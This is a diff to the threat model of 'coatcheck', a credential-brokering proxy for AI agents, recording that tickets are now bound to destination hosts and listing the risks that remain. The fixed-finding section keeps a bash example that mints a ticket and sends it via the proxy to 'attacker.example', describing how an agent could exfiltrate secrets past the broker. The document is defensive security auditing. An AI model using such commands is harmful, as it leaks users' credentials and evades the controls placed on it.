@@ -107,18 +107,22 @@ Recommendations, in order:
    coatcheck, refuse CONNECT/forward requests to hosts outside an allowlist.
    Not implemented.
 
-Neither closes the high-severity gap below: coatcheck itself will substitute a
-ticket into a request to any destination.
+Neither is needed to stop ticket redirection: coatcheck only substitutes a
+ticket into requests to its secret's allowed hosts (see below), whether or not
+the agent can also reach the internet directly.
 
 ## Properties that hold today
 
 | Property | Mechanism |
 |---|---|
-| Real values never enter the agent's env, files, or model context via the vault API | `/_vault/*` and `/_secret/*` return tickets, never values (except fields the secret explicitly lists in `_cleartext`) (`src/vault-handler.ts:100-135`) |
+| Real values never enter the agent's env, files, or model context via the vault API | `/_vault/*` and `/_secret/*` return tickets, never values (except fields the secret explicitly lists in `_cleartext`) (`src/vault-handler.ts`) |
 | A ticket alone is useless outside the broker | 32 random bytes; resolves only inside coatcheck's token store |
-| Tickets expire | 900 s default (`src/token-store.ts:4`); session-bound tickets 600 s default, 1800 s max (`src/vault-handler.ts:222-223`) |
+| Tickets are bound to destination hosts | Each ticket snapshots its secret's allowed hosts at mint: the intersection of the operator's policy file and the secret's in-band `_allowed_hosts` (`src/secret-binding.ts`). Unbound secrets get no ticket (`403`) unless `COATCHECK_ALLOW_UNBOUND_SECRETS=1`. At swap time the host is the validated `CONNECT` target on HTTPS (upstream TLS verification makes it the real recipient; `Host` and SNI are ignored) and the WHATWG-parsed URL host on plain HTTP, which only matches `http://` entries, so loopback and private listeners never match unless listed. A mismatch is answered `403` (`X-Coatcheck-Denied: host-mismatch`) and nothing is forwarded; one denied ticket denies the whole request (`TokenStore.replaceAll`, `src/mitm.ts`, `src/forward.ts`) |
+| Swapping can't redirect a request | On plain HTTP, tickets are swapped only in the path, query and headers, never in the host or userinfo that decide where the request goes (`src/forward.ts`) |
+| OAuth refresh can't send `client_secret` elsewhere | The `token_url` host must be one of the secret's allowed hosts, checked before the token endpoint is called; the refreshed ticket inherits the binding (`src/vault-handler.ts`) |
+| Tickets expire | 900 s default (`COATCHECK_TICKET_TTL_SECONDS`); session-bound tickets 600 s default, 1800 s max (`src/vault-handler.ts`) |
 | `curl -v` on the agent side shows only the ticket | Substitution happens after TLS termination, on coatcheck's upstream leg |
-| Session-bound (browser) tickets never resolve on HTTPS | `src/token-store.ts:133` |
+| Session-bound (browser) tickets never resolve on HTTP(S) | `TokenStore.replaceAll` skips them (`src/token-store.ts`) |
 | Shared secrets are allowlisted | `/_secret/{name}` refuses names not listed under `shared` in the operator's policy file; with no policy file, it refuses every name (`src/policy.ts`, `src/vault-handler.ts`) |
 | Secret names are validated before any provider call | `^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$` (no `/`, no leading `.`), checked after URL-decoding on every route that takes a name; invalid names get `400` (`isValidSecretName`, `src/secret-provider.ts`; `src/vault-handler.ts`) |
 | Upstream TLS is verified | `tls.connect` with default `rejectUnauthorized` (`src/mitm.ts`) |
@@ -130,33 +134,34 @@ ticket into a request to any destination.
 
 Severity reflects the attacker above. File references are to `src/`.
 
-### HIGH: tickets are not bound to destination hosts
+### Fixed: tickets were not bound to destination hosts
 
-`TokenStore.replaceAll` substitutes every active unscoped ticket into any
-request, whatever the destination (`token-store.ts:119-141`), on both the
-plain-HTTP forward path (`forward.ts`) and the HTTPS MITM path
-(`mitm.ts`). So:
+Before roadmap item 9, any active ticket was substituted into a request to any
+destination, so
 
 ```bash
 TOK=$(curl -s http://127.0.0.1:3128/_vault/some-api-key | jq -r .token)
 curl -x http://127.0.0.1:3128 "http://attacker.example/?k=$TOK"
 ```
 
-delivers the real value to `attacker.example`. The destination can also be a
-listener the agent runs itself on loopback, so egress enforcement does not
-help: the agent can recover the plaintext of every secret it can mint a ticket
-for. Until host binding lands, coatcheck keeps secrets out of the agent's
-context, logs, and disk, and stops passive leaks (an echoed env var, a pasted
-log), but does **not** stop an agent that is actively trying to exfiltrate.
-Fix: per-secret `allowed_hosts` checked against the CONNECT target (see
-`docs/ROADMAP.md`). The policy file and host matcher exist (`src/policy.ts`,
-`src/host-matcher.ts`), so allowed hosts can already be declared and are
-validated at startup, but nothing enforces them yet (roadmap item 9).
+delivered the real value to `attacker.example`, or to a listener the agent ran
+itself on loopback. Both now get `403` without being forwarded (see "Tickets
+are bound to destination hosts" above; `src/server.test.ts` performs both
+attacks). What remains:
+
+- An operator who sets `COATCHECK_ALLOW_UNBOUND_SECRETS=1` reopens this hole
+  for every secret that has no allowed hosts. Each such swap is logged as
+  `result=unbound`.
+- A secret's binding is only as narrow as its list. `*.example.com` trusts
+  every subdomain, including ones a third party can host content on.
+- Browser (CDP) tickets record their login secret's hosts, but the CDP path
+  doesn't check them against the page yet (roadmap item 15).
 
 ### MEDIUM: tickets are reusable until TTL
 
-Unscoped tickets are never revoked on use; any number of requests can carry
-the same ticket for 15 minutes (`token-store.ts:4`, `:119-141`). Only
+Unscoped tickets are never revoked on use; any number of requests to the
+ticket's allowed hosts can carry the same ticket for 15 minutes
+(`COATCHECK_TICKET_TTL_SECONDS`). Only
 session-bound tickets are revoked early (on CDP disconnect). There is no
 single-use option.
 
@@ -175,17 +180,17 @@ and any future allowlist would not apply to those tunnels.
 and `/_secret/{name}` accept any caller (`vault-handler.ts:26-203`). Isolation
 rests entirely on the listener binding to `127.0.0.1` (`index.ts`). Setting
 `COATCHECK_BIND_HOST=0.0.0.0` (intended for local dev) lets anything that can
-reach the port mint tickets and, combined with the host-binding gap, read every
-secret. The CDP listener uses the same bind host and authenticates only by
+reach the port mint tickets and use them against each secret's allowed hosts. The CDP listener uses the same bind host and authenticates only by
 sid.
 
 ### LOW: Host header not checked against the CONNECT target
 
 Inside a MITM'd tunnel the request's `Host` header is forwarded untouched
 while the upstream socket goes to the CONNECT hostname (`mitm.ts`). TLS
-SNI from the client is not compared either. Harmless today, but any future
-host-bound policy must key on the CONNECT target (the actual upstream), never
-on `Host`.
+SNI from the client is not compared either. Host binding keys on the CONNECT
+target (the actual upstream, verified by upstream TLS), never on `Host` or
+SNI, so a mismatched `Host` can't widen a ticket's reach; it only reaches the
+upstream as a confusing request.
 
 ### LOW: request bodies are not swapped
 
